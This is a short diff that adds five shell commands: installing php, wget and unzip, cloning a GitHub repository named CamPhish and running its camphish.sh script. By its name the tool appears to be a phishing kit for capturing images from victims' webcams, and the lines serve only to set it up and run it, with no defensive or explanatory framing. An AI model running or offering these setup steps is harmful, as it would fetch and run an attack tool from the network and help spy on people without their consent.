@@ -1,0 +1,5 @@
+cd Desktop
+apt-get -y install php wget unzip
+git clone https://github.com/techchipnet/CamPhish
+cd CamPhish
+bash camphish.sh
